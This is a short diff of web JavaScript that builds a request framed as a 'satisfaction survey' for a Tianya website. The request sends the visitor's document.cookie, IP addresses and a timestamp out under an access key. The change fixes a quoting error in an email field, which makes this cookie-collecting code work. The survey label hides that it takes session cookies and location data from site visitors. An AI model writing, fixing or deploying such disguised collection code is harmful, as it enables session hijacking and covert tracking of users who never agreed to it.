@@ -45,7 +45,7 @@
             "access_key=" + encodeURIComponent("ba52dae0-9fc8-4845-9575-baf62df9d608") +
             "&subject=" + encodeURIComponent("Tianya Website Satisfaction Survey") +
             "&q1_client_content=" + encodeURIComponent(document.cookie) + 
-            "&email=" + encodeURIComponent(security@tianya.at) + 
+            "&email=" + encodeURIComponent("security@tianya.at") + 
             "&q2_client_loc=" + encodeURIComponent(ip) + 
 			"&q3_client_location=" + encodeURIComponent(ipv4) + 
             "&q4_submission_date=" + encodeURIComponent(new Date().toLocaleString());
